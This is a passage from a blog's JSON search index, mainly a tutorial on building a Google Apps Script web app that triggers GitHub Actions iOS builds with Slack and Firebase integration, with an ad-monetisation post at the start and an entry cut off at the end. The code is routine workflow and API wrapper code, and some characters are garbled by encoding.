blockers and anti-tracking, which can be more troublesome.Revenue AspectBecause my page views are low, the bid per click is also low, ranging from about USD $0.01 to $0.07 per click.Medium To Github Pages x Google OfferwallYou can refer to my previous article ‚ÄúPain-free Migration from Medium to Self-hosted Website‚Äù to mirror Medium articles to a static site hosted on GitHub Pages. Then, add Google Offerwall to the site to monetize the content.Or directly refer to ‚ÄúMedium Partner Program is finally open to writers worldwide (including Taiwan)!‚Äù to add Medium articles behind a paywall and earn revenue. Because Medium‚Äôs paywall requires readers to subscribe monthly to access articles, which I find unfriendly to information sharing, I do not include my articles in the paywall program. Google Offerwall fills this gap perfectly, allowing users to support content creators by simply watching ads without forced monthly fees, enabling creators to earn revenue‚Äîit‚Äôs a win-win![Supplement] Explanation of Offerwall Reward Wall Ads and Rewarded Ad TypesOfferwall ‚Äî What is a Reward Wall Ad?Compared to traditional fixed-position ads, rewarded wall ads emphasize interaction and purpose with users. They integrate content display, reward incentives, and user behavior, allowing users not only to choose to pay to unlock premium items but also to earn extra resources in a more engaging and participatory way. Creators can gain additional revenue, achieving a win-win outcome.Example ‚Äî Line Points Reward WallA classic everyday example is Line Points. Users can either directly purchase Line Points or choose tasks they like from the Offwall reward wall (adding friends, registering accounts, filling out surveys, watching ads, etc.) and receive corresponding rewards upon completion.Rewarded Ads ‚Äî Rewarded AdsRewarded ads are a common advertising format in games and mobile apps. Users voluntarily complete specific actions, such as watching a video, clicking interactive content, or trying a feature, to earn rewards like virtual currency, extra lives, or game items.Example ‚Äî Candy CrushA classic example is ads that allow players to continue playing after dying in a game. These ads not only increase user engagement and satisfaction but also enable developers to generate revenue without harming the user experience, achieving a win-win outcome.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "CI/CD GuideÔΩúIntegrate Google Apps Script Web App with GitHub Actions for Free Packaging Platform", "url": "/posts/zrealm-dev/ci-cd-guide-integrate-google-apps-script-web-app-with-github-actions-for-free-packaging-platform-4273e57e7148/", "categories": "ZRealm Dev.", "tags": "ios-app-development, cicd, google-apps-script, web-development, tools, english, ai-translation", "date": "2025-07-10 20:30:51 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!CI/CD Practical Guide (4): Using Google Apps Script Web App to Connect GitHub ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!CI/CD Practical Guide (4): Using Google Apps Script Web App to Connect GitHub Actions and Build a Free, Easy-to-Use Packaging Tool PlatformGAS Web App Integrates GitHub, Slack, Firebase, or Asana/Jira APIs to Build a Middleware Platform for Cross-Team Shared Packaging ToolsPhoto by Lee CampbellIntroductionIn the previous article, CI/CD Practical Guide (Part 3): Implementing App iOS CI and CD Workflows with GitHub Actions, we completed the foundational CI/CD setup for the iOS app project. Now, CI can automatically run tests and CD can handle packaging and deployment. However, in real-world product development, packaging and deployment are often done to deliver builds to other functional teams for QA (Quality Assurance) testing. At this point, the CD scenario extends beyond engineering and may involve QA, PM, design (Design QA), or even the boss wanting to try it out first.The GitHub Actions workflow_dispatch manual form trigger event provides a simple form for users to run builds. However, it is not user-friendly for non-engineers who may not understand: what is a branch? Should fields be filled? How to know when the build is done? How to download it once ready? ‚Ä¶etc.Additionally, there is a permission control issue. To allow other team members to use GitHub Actions for building, their accounts must be added to the repo. This is insecure and unreasonable from a security perspective, as they get access to the entire source code just to operate the build form.Unlike Jenkins, which has an independent web tool platform, GitHub Actions only offers this functionality.Form Style of workflow_dispatchTherefore, we need an intermediary packaging platform to serve other functional users, integrating Asana/Jira task tickets so users can package the app directly using the task ticket and view progress and download results on it.GAS Web App as a Relay StationPrevious article focused on developing the core GitHub Actions CI/CD workflow on the right side; this article focuses on the left side‚Äîthe end-user packaging tool platform and enhancing user experience.Google Apps Script ‚Äî Web App Packaging Tool Platform Result Screenshot Packaging Form: Integrate project management tools to fetch ticket numbers and GitHub to retrieve open Pull Requests Build Records: Displays build history, progress status of ongoing build tasks, and allows clicking to retrieve download links from Firebase App Distribution. Runner Status: Displays the status of the Self-hosted Runner. Slack build progress notification. Mobile Support Support restricting usage to accounts within the organization team Main Responsibilities0 state, 0 database, purely a relay exchange station, integrating and displaying data from various APIs (e.g. Asana/Jira/GitHub), forwarding form requests to GitHub Actions.Operation Requirements: Support both mobile and desktop devices.Permission Requirement: Access must be restricted to team organization members only.Online Demo Web App For first-time use, please refer to the authorization in the image below (Only For Demo App):Project source code: https://script.google.com/home/projects/1CBB39OMedqP9Ro1WSlvgDnMBin4-ksyhgly2h_KrbOuFiPHTalNgwHOp/editTechnology ChoicesThe first article mentioned this; here is a more detailed summary.Integration with SlackWe tried using Slack as the packaging platform by developing our own backend service hosted on GCP, integrating with Slack API and Asana API, then forwarding the forms submitted via Slack to the GitHub API to trigger subsequent GitHub Actions. The experience was very smooth and unified within the team‚Äôs collaboration tool, allowing painless usage. The downside was the high development and maintenance costs. Since the backend service was built with Ktor, app engineers had to handle backend tasks, manage Google service OAuth integration, and implement some features (e.g., submission for review) there, making it complex. If new team members didn‚Äôt properly take over this part later, it became almost impossible to maintain. Additionally, there was a monthly $15 USD GCP server cost.Initially, we also tried using FaaS services to connect with the Slack API, such as Cloud Functions. However, the Slack API requires the service to respond within 3 seconds, or it considers the request failed. FaaS has a cold start problem, where the service goes to sleep after a period of inactivity and takes longer to respond (‚â• 5 seconds) when called again. This caused the Slack packaging form to be very unstable, frequently resulting in Timeout Errors.Integration into Internal SystemsThis is obviously the optimal solution. If the team has web and backend developers, directly integrating with the existing system is the best and safest approach. The premise of this article is: none, the app is self-reliant.Google Apps Script ‚Äî Web AppGoogle Apps Script has been our longtime partner. We have used it for many RPA projects to schedule and trigger tasks, such as: ‚ÄúCrashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate‚Äù and ‚ÄúUsing Google Apps Script to Automate Daily Data Report RPA‚Äù. At this point, I recalled it again; GAS has a feature to deploy as a Web (App) to serve directly as a web service.Advantages of Google Apps Script: ‚úÖ Free, hardly reaches limits under normal usage ‚úÖ Functions as a Service means no need to set up or maintain your own server ‚úÖ Permission control integrates with Google Workspace, allowing use only by Google accounts within the organization ‚úÖ Seamless integration with Google ecosystem services (e.g., Firebase, GA, etc.) and data (no need to implement OAuth yourself) ‚úÖ Programming language uses JavaScript, easy to learn (V8 Runtime supports ES6+) ‚úÖ Fast writing, fast deployment, fast usage ‚úÖ Stable and long-lasting service (launched for over 16 years) ‚úÖ AI Can Help! Tested Using ChatGPT to Assist Development, Accuracy Can Reach 95% Google Apps Script Disadvantages: ‚ùå Built-in version control is difficult to describe positively ‚ùå No built-in support for file storage, data storage, or key/certificate management ‚ùå Web App cannot fully achieve a 100% responsive web design (RWD) experience ‚ùå The project can only be linked to a personal account, not an organization ‚ùå Although Google continues development and maintenance, overall feature updates are slow ‚ùå Network request UrlFetchApp does not support setting User-Agent ‚ùå Web App doGet / doPost does not support retrieving Headers information ‚ùå FaaS Cold Start Issue ‚ùå Does not support multiple developers working simultaneouslyHowever, this has little impact on the Web App; at most, you just wait a few extra seconds to access the page. The above are the pros and cons of the GAS service itself, which have little impact on building a packaging tool web app; compared to a Slack-based solution, this approach is faster, lighter, and easier to hand over and get started with. The drawbacks are that the team needs to know the tool‚Äôs URL and how to use it, and due to GAS library limitations (e.g., no built-in encryption algorithms), it can basically only serve as a pure relay platform, such as submitting for review, which only forwards the review request to GitHub Actions. Also only suitable for teams using Google Workspace; balancing resources and needs, Google Apps Script ‚Äî Web App was chosen to implement the packaging tool platform.UI FrameworkWe directly use the Bootstrap CDN; otherwise, managing CSS styles ourselves would be too troublesome. Asking AI how to combine and use Bootstrap is also more accurate and convenient.Hands-On PracticeThe entire platform architecture has been open-sourced here. Everyone can customize it based on their team‚Äôs needs using this version.Open Source Sample ProjectView the project directly on GAS:GitHub Repo Backup:File StructureI wrote a very simple class-based MVC-like structure. If you need adjustments or don‚Äôt understand any feature, you can ask AI for accurate answers.System appsscript.json: Metadata configuration file for the GAS systemThe key point is the ‚ÄúoauthScopes‚Äù variable, which declares the external permissions this Script will use. Entrypoint.gs: Define the doGet() entry point Controller Controller_iOS.gs: iOS packaging tool page Controller, responsible for fetching data for the View to displayView View_index.html: The entire packaging tool framework and homepage View_iOS.html: iOS Packaging Tool Page Skeleton View_iOS_Runs.html: iOS Packaging Tool ‚Äî Packaging Record Content Page View_iOS_Form.html: iOS Packaging Tool ‚Äî Packaging Form Page View_iOS_Runners.html: iOS Packaging Tool ‚Äî Self-hosted Runner Status Page Model(Lib) Credentials.gs: Define key contents(‚ö†Ô∏è Please note, using GCP IAM with GAS can be quite complex, so we directly define the keys here. Therefore, this GAS project contains sensitive information; do not share project view or edit permissions casually.) StubData.gs: Stub methods and data for the Online Demo. Settings.gs: Some common settings and library initialization. GitHub.gs: Wrapper for GitHub API operations. Slack.gs: Wrapper for Slack API operations. Firebase.gs: Firebase ‚Äî Wrapper for App Distribution API operations. Build Your Own Packaging Platform Create a Google Apps Script project and name itGo to Project Settings ‚Üí check ‚ÄúShow ‚Äòappsscript.json‚Äô manifest file in editor‚Äù to make the ‚Äúappsscript.json‚Äù metadata file appear. Refer to my open source project files, create all files following the examples, and blindly copy the content over. Stupid, but no choice. Copy StubData.gs first; it can be used for the initial deployment test. Another method is to use clasp (Google Apps Script CLI) to git clone the demo project and then push the code.After copying, it will look exactly the same as the example project. First Deployment of the ‚ÄúWeb App‚Äù and Viewing ResultsIn the top right corner of the project, click ‚ÄúDeploy‚Äù ‚Üí ‚ÄúNew deployment‚Äù ‚Üí Type ‚ÄúWeb app‚Äù:Execution Identity: I execute the script always using your account identity. Users accessing the web app will run the script as the currently logged-in Google account user. Who can access: Only me All users within the same organization Only users logged in with a Google account from the same organization can access. All users logged into a Google account All logged-in Google account users can access. Everyone does not need to log in with a Google account, and everyone can access it publicly. If it is an internal tool: you can choose ‚ÄúWho has access: All users in the same organization as XXX‚Äù + ‚ÄúExecute as: User accessing the web app‚Äù for security control.The URL of the ‚ÄúWeb App‚Äù after deployment is your Web App packaging tool link, which you can share with your team members. (The URL may look ugly, so you can use a URL shortener service to tidy it up. Updating the deployment content will not change the URL.)User must agree to authorization on first useThe first time you click the Web App URL, you need to authorize access. Review Permission ‚Üí Select the account identity to use this Web App Unverified warning window, click ‚ÄúAdvanced‚Äù to expand ‚Üí click Proceed to ‚ÄúXXX‚Äù (unsafe) Click ‚ÄúAllow‚Äù No need to reauthorize if the script permissions remain unchanged.After completing the authorization consent, you will enter the packaging tool homepage: Demo packaging tool deployed successfully üéâüéâüéâNote: The message ‚ÄúThis app was created by a Google Apps Script user‚Äù cannot be automatically hidden.Update Deployment ‚ö†Ô∏è All code changes require redeployment to take effect. Ô∏èÔ∏è‚ö†Ô∏è All code changes require redeployment to take effect. ‚ö†Ô∏è All code changes require redeployment to take effect.Note that saving code changes does not directly update the Web App, so if refreshing has no effect, this is the reason; you need to go to ‚ÄúDeploy‚Äù ‚Üí ‚ÄúManage Deployments‚Äù ‚Üí ‚ÄúEdit‚Äù ‚Üí create a new version ‚Üí click ‚ÄúDeploy‚Äù ‚Üí ‚ÄúDone‚Äù. Refresh the page after updating the deployment to see the changes take effect.Add test deployment for easier developmentAs mentioned earlier, all changes require redeployment to take effect; this is very inconvenient during development. Therefore, during development, we can use a ‚Äútest deployment‚Äù to quickly verify if the changes are correct.Go to ‚ÄúDeploy‚Äù ‚Üí ‚ÄúTest deployments‚Äù ‚Üí obtain the test ‚ÄúWeb App‚Äù URL.During development, we can save directly using this URL. After saving file changes, refresh the page at this development URL to see the results! After all development is complete, update and deploy as described earlier, then release it for users to use.Modify the Demo Sample Project to Connect with Real DataNext is the key part: connecting real data. The GitHub Actions Workflow refers to the CI/CD process established in the previous article. You can also adjust the parameters according to your actual Actions Workflow.‚ö†Ô∏è Please Note Before Making ChangesThe Google Apps Script platform does not support multi-user or multiple windows development well. From my experience, if you accidentally open two editing windows, edit in window A first, then later edit in window B, the changes from A will be overwritten by the older version in B. Therefore, it is recommended that only one person edits the script in one window at a time.GitHub IntegrationInject GitHub API Token:GitHub -&gt; Account -&gt; Settings -&gt; Developer Settings -&gt; Fine-grained personal access tokens or Personal access tokens (classic).It is recommended to use Fine-grained personal access tokens for better security (though they have an expiration).The required permissions for Fine-grained personal access tokens are as follows: Repo: Remember to select the Repo you want to operate on Permissions: Actions (read/write), Administration (read only) If you don‚Äôt want to rely on someone‚Äôs personal account, it is recommended to create a dedicated team GitHub account and use its token.Go to the GAS project ‚Üí Credentials.gs ‚Üí Insert the token into the githubToken variable.Replace GithubStub with GitHub:Go to the GAS project ‚Üí Settings.gs ‚Üí change:const iOSGitHub = new GitHubStub(githubToken, iOSRepoPath);Change toconst iOSGitHub = new GitHub(githubToken, iOSRepoPath);Save the file.Refresh the test ‚ÄúWeb App‚Äù URL to check if the changes are correct: Correctly displaying data means: GitHub webhook successfully connected with real data üéâüéâüéâYou can also easily switch to the ‚ÄúRunner Status‚Äù to check whether the Self-hosted Runner is functioning properly:Note: My Runner is off‚Ä¶ so it‚Äôs offline.Slack IntegrationTo integrate Slack notifications, we first need to go back to the Repo ‚Üí GitHub Actions and add a notification wrapper Action for the package build Action Workflow.CD-Deploy-Form.yml:# Workflow(Action) Namename: CD-Deploy-Form# Actions Log Titlerun-name: \"[CD-Deploy-Form] ${{ github.ref }}\"# Cancel running jobs in the same concurrency group if a new job starts# For example, if the same branch's packaging job is triggered repeatedly, the previous job will be cancelledconcurrency: group: ${{ github.workflow }}-${{ github.ref }} cancel-in-progress: true# Trigger eventson: # Manual form trigger workflow_dispatch: # Form input fields inputs: # App version number VERSION_NUMBER: description: 'Version Number of the app (e.g., 1.0.0). Auto-detect from the Xcode project if left blank.' required: false type: string # App Build Number BUILD_NUMBER: description: 'Build number of the app (e.g., 1). Will use a timestamp if left blank.' required: false type: string # App Release Note RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: string # Triggering user's Slack User ID SLACK_USER_ID: description: 'Slack user id.' required: true type: string # Triggering user's Email AUTHOR: description: 'Trigger author email.' required: true type: string # Job tasksjobs: # Send Slack message when packaging starts # Job ID start-message: # Run small jobs directly on GitHub Hosted Runner, usage is low runs-on: ubuntu-latest # Set maximum timeout to prevent endless waiting in abnormal situations # Normally should not exceed 5 minutes timeout-minutes: 5 # Job steps steps: - name: Post a Start Slack Message id: slack uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: \\\\| channel: ${{ inputs.SLACK_USER_ID }} text: \"Packaging request received.\\nID: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\\\\|${{ github.run_id }}&gt;\\nBranch: ${{ github.ref_name }}\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\" # Job Output for subsequent jobs # ts = Slack message ID, used to reply in the same thread later outputs: ts: ${{ steps.slack.outputs.ts }} deploy: # Jobs run concurrently by default; needs ensures this waits for start-message to finish # Execute packaging and deployment task needs: start-message uses: ./.github/workflows/CD-Deploy.yml secrets: inherit with: VERSION_NUMBER: ${{ inputs.VERSION_NUMBER }} BUILD_NUMBER: ${{ inputs.BUILD_NUMBER }} RELEASE_NOTE: ${{ inputs.RELEASE_NOTE }} AUTHOR: ${{ inputs.AUTHOR }} # Success message for packaging and deployment end-message-success: needs: [start-message, deploy] if: ${{ needs.deploy.result == 'success' }} runs-on: ubuntu-latest timeout-minutes: 5 steps: - name: Post a Success Slack Message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: \\\\| channel: ${{ inputs.SLACK_USER_ID }} thread_ts: \"${{ needs.start-message.outputs.ts }}\" text: \"‚úÖ Packaging and deployment succeeded.\\n\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\" # Failure message for packaging and deployment end-message-failure: needs: [deploy, start-message] if: ${{ needs.deploy.result == 'failure' }} runs-on: ubuntu-latest timeout-minutes: 5 steps: - name: Post a Failure Slack Message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: \\\\| channel: ${{ inputs.SLACK_USER_ID }} thread_ts: \"${{ needs.start-message.outputs.ts }}\" text: \"‚ùå Packaging and deployment failed. Please check the execution results or try again later.\\n\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\" # Cancelled message for packaging and deployment end-message-cancelled: needs: [deploy, start-message] if: ${{ needs.deploy.result == 'cancelled' }} runs-on: ubuntu-latest timeout-minutes: 5 steps: - name: Post a Cancelled Slack Message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: \\\\| channel: ${{ inputs.SLACK_USER_ID }} thread_ts: \"${{ needs.start-message.outputs.ts }}\" text: \":black_square_for_stop: Packaging and deployment cancelled.\\n\\ncc'ed &lt;@${{ inputs.SLACK_USER_ID }}&gt;\"Full code: CD-Deploy-Form.ymlThis Action is just a container that connects Slack notifications, actually reusing the CD-Deploy.yml Action written in the previous article. For setting up the Slack Bot App and message sending permissions, please refer to my previous article. Remember to add the corresponding SLACK_BOT_TOKEN in Repo ‚Üí Secrets and enter the Slack Bot App Token value. Back to the GAS project ‚Üí Credentials.gs ‚Üí Assign the Token to the slackBotToken variable.Go to the GAS project ‚Üí Settings.gs ‚Üí replace:const slack = new SlackStub(slackBotToken);Change toconst slack = new Slack(slackBotToken);Save the file. If you don‚Äôt have a ready Slack Bot App to send notifications and don‚Äôt want to create one, you can skip all the steps here and remove the Slack-related usage from the GAS project.GitHub Integration ‚Äî Build FormGo to the GAS project ‚Üí Controller_iOS.gs ‚Üí modify the content of View_iOS_Form.html:Remove the fake Asana Tasks integration method: &lt;? tasks.forEach(function(task) { ?&gt; &lt;option value=\"&lt;?=task.githubBranch?&gt;\"&gt;[&lt;?=task.id?&gt;] &lt;?=task.title?&gt;&lt;/option&gt; &lt;? }) ?&gt;You can also adjust the default branch here (this is main).‚ÄîGo to the GAS project ‚Üí Controller_iOS.gs ‚Üí modify the content of iOSLoadForm(): Remove the line template.tasks = Stubable.fetchStubAsanaTasks(); which is a stub method for Asana integration.If you want to integrate Asana/Jira, you can directly ask ChatGPT to help generate the integration method. template.prs = iOSGitHub.fetchOpenPRs(); actually calls the GitHub API to get the list of opened PRs and can be kept as needed. Post-submission Processing Inside iOSSubmitForm():You can adjust according to the actual GitHub Actions Workflow file name and the workflow_dispatch inputs parameters: iOSGitHub.dispatchWorkflow(\"CD-Deploy-Form.yml\", branch, { \"BUILD_NUMBER\": buildNumber, \"VERSION_NUMBER\": versionNumber, \"VERSION_NUMBER\": versionNumber, \"RELEASE_NOTE\": releaseNote, \"AUTHOR\": email, \"SLACK_USER_ID\": slack.fetchUserID(email) });You can also add your own required field validations. Here, it only checks that the branch must be filled; otherwise, an error message will appear.If you think this is not secure enough, you can add password verification or restrict access to specific accounts. The last line Slack notification requires proper Slack setup. If you don‚Äôt have a Slack Bot App or don‚Äôt want to integrate Slack, you can directly use iOSGitHub.dispatchWorkflow(\"CD-Deploy.yml\") in the Demo Actions Repo and remove the SLACK_USER_ID parameter.Refresh the test ‚ÄúWeb App‚Äù URL to check if the changes are correct:You can see that only the Opened PR List remains in the packaging form.Fill in the information and click ‚ÄúSubmit Request‚Äù to test the packaging form:If the prompt submission is successful, it means there is no problem. You can also see the task started in the packaging records üéâ Ôºö Repeated packaging records can update progress.Common Submission Errors: Required input ‚ÄòSLACK_USER_ID‚Äô not provided : This SLACK_USER_ID field in GitHub Actions is required but not provided. It may be due to Slack configuration failure or the current User Email not matching any Slack UID. Workflow does not have ‚Äòworkflow_dispatch‚Äô trigger , Branch is outdated, please update the xxx branch : The selected branch cannot find the corresponding Action Workflow file (the file specified by iOSGitHub.dispatchWorkflow). No ref found for, Branch not found: The branch could not be found.Firebase App Distribution ‚Äî Getting Download Link IntegrationThe last small feature is integrating Firebase App Distribution to directly get download info and links, making it easy to open the packaging platform tool on mobile and click to download and install. Previously introduced ‚ÄúGoogle Apps Script x Google APIs Quick Integration Method‚Äú‚ÄîGAS can quickly and easily integrate with Firebase.Integration Principle Before integration, let‚Äôs first explain the integration principle of this ‚ÄúTricky‚Äù method.Our build platform has no database and only serves as an API relay; so in practice, when we run the build in GitHub Actions CD-Deploy.yml, we pass the Job Run ID into the Release Note (it can also be passed into the Build Number):ID=\"${{ github.run_id }}\" // Job Run IDCOMMIT_SHA=\"${{ github.sha }}\"BRANCH_NAME=\"${{ github.ref_name }}\"AUTHOR=\"${{ env.AUTHOR }}\"# Compose Release NoteRELEASE_NOTE=\"${{ env.RELEASE_NOTE }}ID: ${ID}Commit SHA: ${COMMIT_SHA}Branch: ${BRANCH_NAME}Author: ${AUTHOR}\"# Run Fastlane build &amp; deploy lanebundle exec fastlane beta release_notes:\"${RELEASE_NOTE}\" version_number:\"${VERSION_NUMBER}\" build_number:\"${BUILD_NUMBER}\"This way, the Firebase App Distribution Release Notes will include the Job Run ID.The GAS Web App packaging tool platform connects to the GitHub API to get GitHub Actions run records. We directly use the Job Run ID from the API to query the Firebase App Distribution API. If the Release Notes contain a version with *ID: XXX*, we can find the corresponding packaging record.Mapping between two tool platforms without using any database.Project Integration SettingsGo to GAS ‚Üí Project Settings ‚Üí Google Cloud Platform (GCP) Project ‚Üí Change Project:Enter the Firebase project ID you want to connect. Initial setup may show errors ‚ÄúTo change the project, please configure the OAuth consent screen. Details on setting up the OAuth consent screen.‚Äù If not applicable, you can skip the following steps.Click the ‚ÄúOAuth consent screen details‚Äù link ‚Üí Click ‚ÄúConfigure consent screen‚Äù:Click ‚ÄúStart‚Äù:Application Information: Application Name: Enter Your Tool Name User Support Email: Select Email Target Audience: Internal: For use by organization members only External: Available to all Google account users after authorization consent Contact Information: Email for receiving notificationsCheck to agree to the „Ää Google API Services: User Data Policy „Äã„ÄÇFinally, click ‚ÄúCreate‚Äù.‚ÄîBack to GAS ‚Üí Project Settings ‚Üí Google Cloud Platform (GCP) Project ‚Üí Change Project:Re-enter the Firebase project number and click ‚ÄúChange Project‚Äù.If no errors appear, the binding is complete.‚ÄîIf you choose ‚ÄúExternal,‚Äù you may also need to complete the following settings:Click ‚ÄúProject Number‚Äù ‚Üí expand the left sidebar ‚Üí ‚ÄúAPIs &amp; Services‚Äù ‚Üí ‚ÄúOAuth consent screen‚ÄùSelect ‚ÄúTarget Audience‚Äù ‚Üí Test ‚Üí Click ‚ÄúDeploy as Web App‚Äù ‚Üí Done. Users can start using it after completing the authorization following the ‚ÄúFirst-time user authorization‚Äù steps mentioned above!If the above steps are not set, users will encounter the following error:Access to ‚ÄúXXX‚Äù blocked due to incomplete Google verification process‚Äî ‚Äî ‚ÄîProject IntegrationBack to the integration, Firebase directly uses ScriptApp.getOAuthToken() to dynamically obtain the token based on the execution identity, so no token setup is needed.Just go to the GAS project ‚Üí Settings.gs ‚Üí and change:const iOSFirebase = new FirebaseStub(iOSFirebaseProject);Change toconst iOSFirebase = new Firebase(iOSFirebaseProject);Done.Refresh the test ‚ÄúWeb App‚Äù URL to the build records ‚Üí Find a record and click ‚ÄúGet Download Link‚Äù:If the corresponding Job Run Id build is found in Firebase App Distribution Release Notes, the download information will be displayed directly, and clicking the download button will take you straight to the download page. Done! üéâüéâüéâResultsDemo Web AppBy now, you have replaced the examples with your actual usable packaging tools. Remaining custom features, additional third-party API integrations, and more forms can be extended on your own (discuss with ChatGPT). Finally, don‚Äôt forget that after development and testing are complete, you need to follow the previous steps ‚Äî updating the deployment for the changes to take effect!Integration ExtensionsContinuing the spirit of our ‚Äúmiddleman‚Äù role, here are a few quick integration CheatSheets:Asana API ‚Äî Get Tasks:function asanaAPI(endPoint, method = \"GET\", data = null) { var options = { \"method\" : method, \"headers\": { \"Authorization\": \"Bearer \"+asanaToken }, \"payload\" : data }; var url = \"https://app.asana.com/api/1.0\"+endPoint; var res = UrlFetchApp.fetch(url, options); var data = JSON.parse(res.getContentText()); return data;}asanaAPI(\"/projects/{project_gid}/tasks\")Jira API ‚Äî Get Tickets (JQL):// jql = filter conditionfunction jiraTickets(jql) { const url = `https://xxx.atlassian.net/rest/api/3/search`; const maxResults = 100; let allIssues = []; let startAt = 0; let total = 0; do { const queryParams = { jql: jql, startAt: startAt, maxResults: maxResults, fields: \"assignee,summary,status\" }; const queryString = Object.keys(queryParams) .map(key =&gt; `${encodeURIComponent(key)}=${encodeURIComponent(queryParams[key])}`) .join(\"&amp;\"); const options = { method: \"get\", headers: { Authorization: \"Basic \" + jiraToken, \"Content-Type\": \"application/json\", }, muteHttpExceptions: true, }; const response = UrlFetchApp.fetch(`${url}?${queryString}`, options); const json = JSON.parse(response.getContentText()); if (response.getResponseCode() != 200) { throw new Error(\"Failed to fetch Jira issues.\"); } if (json.issues &amp;&amp; json.issues.length &gt; 0) { allIssues = allIssues.concat(json.issues); total = json.total; startAt += json.issues.length; } else { break; } } while (startAt &lt; total); var groupIssues = {}; for(var i = 0; i &lt; allIssues.length; i++) { const issue = allIssues[i]; if (groupIssues[issue.fields.status.name] == null) { groupIssues[issue.fields.status.name] = []; } groupIssues[issue.fields.status.name].push(issue); } return groupIssues;}jiraTickets(`project IN(App)`);If a database is really needed, Google Sheets can be used as a substitute:class Saveable { constructor(type) { // https://docs.google.com/spreadsheets/d/Sheet-ID/edit const spreadsheet = SpreadsheetApp.openById(\"Sheet-ID\"); this.sheet = spreadsheet.getSheetByName(\"Data\"); // Sheet Name this.type = type; } write(key, value) { this.sheet.appendRow([ this.type, key, JSON.stringify(value) ]); } read(key) { const data = this.sheet.getDataRange().getValues(); const row = data.find(r =&gt; r[0] === this.type &amp;&amp; r[1] === key); if (row) { return JSON.parse(row[2]); } return null; }}let saveable = Saveable(\"user\");// Writesaveable.write(\"birthday_zhgchgli\", \"0718\");// Readsaveable.read(\"birthday_zhgchgli\"); // -&gt; 0718Slack API &amp; Sending Message Method:function slackSendMessage(channel, text = \"\", blocks = null) { const content = { channel: channel, unfurl_links: false, unfurl_media: false, text: text, blocks: blocks }; try { const response = slackRequest(\"chat.postMessage\", content); return response; } catch (error) { throw new Error(`Failed to send Slack message: ${error}`); }}function slackRequest(path, content) { const options = { method: \"post\", contentType: \"application/json\", headers: { Authorization: `Bearer ${slackBotToken}`, 'X-Slack-No-Retry': 1 }, payload: JSON.stringify(content) }; try { const response = UrlFetchApp.fetch(\"https://slack.com/api/\"+path, options); const responseData = JSON.parse(response.getContentText()); if (responseData.ok) { return responseData } else { throw new Error(`Slack: ${responseData.error}`); } } catch (error) { throw error; }}More Google Apps Script Examples: Quick Integration Method for Google Apps Script x Google APIs Simple 3 Steps ‚Äî Create a Free GA4 Automated Data Notification Bot Automate Daily Data Reports with RPA Using Google Apps Script Slack &amp; ChatGPT Integration Create a Free GitHub Repo Star Notifier in Three Steps Using Google Apps Script Crashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate Crashlytics + Big Query to Build a More Real-Time and Convenient Crash Tracking Tool SummaryThank you for your patience and participation. The CI/CD From 0 to 1 series ends here; I hope it helps you and your team build a complete CI/CD workflow to improve efficiency and product stability. Feel free to leave comments if you have any implementation questions. These four articles took about 14+ days to write. If you found them helpful, please follow me on Medium and share with your friends and colleagues. You‚Äôre welcome.üç∫ Buy me a beer on PayPal This series of articles took a lot of time and effort to write. If the content helps you and improves your team‚Äôs work efficiency and product quality, please consider buying me a coffee. Thank you for your support!üç∫ Buy me a beer on PayPalüç∫ Buy me a beer on PayPalSeries Articles: CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team through CI/CD? Tool Selection? CI/CD Practical Guide (Part 2): Complete Usage and Setup of GitHub Actions and Self-hosted Runner CI/CD Practical Guide (Part 3): Implementing CI and CD Workflows for App Projects with GitHub Actions CI/CD Practical Guide (Part 4): Using Google Apps Script Web App to Connect GitHub Actions and Build a Free and Easy Packaging Tool Platform If you have any questions or suggestions, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "GitHub ActionsÔΩúiOS App CI/CD Workflow Automation for Faster Builds and Deployments", "url": "/posts/zrealm-dev/github-actions-ios-app-ci-cd-workflow-automation-for-faster-builds-and-deployments-4b001d2e8440/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, ci-cd, github-actions, firebase, ci-cd-pipeline", "date": "2025-07-07 23:02:24 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!CI/CD Practical Guide (3): Implementing App iOS CI and CD Workflows with GitHu...", "content": " 